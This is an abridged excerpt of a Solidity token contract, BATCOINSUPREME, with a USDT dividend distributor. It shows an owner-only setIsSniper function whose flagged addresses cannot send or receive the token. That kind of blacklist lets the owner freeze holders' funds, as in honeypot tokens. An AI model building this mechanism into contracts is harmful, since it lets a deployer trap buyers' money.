...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 REWARDS = IBEP20(0xdAC17F958D2ee523a2206206994597C13D831ec7); //USDT
    address NATIVE = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //WETH
    IDEXRouter router;
    ...
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 34;
    ...
    constructor (address _router) {
        router = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // uniswap router2
        _token = msg.sender;
    }
...
contract BATCOINSUPREME is IBEP20, Auth {
    using SafeMath for uint256;

    address REWARDS = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    ...
    function setIsSniper(address _address, bool _trueorfalse) external onlyOwner(){
        isSniper[_address] = _trueorfalse;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            ...
            require(!isSniper[sender],"Sender is sniper!");
            require(!isSniper[recipient], "Recipient is sniper!");
        }
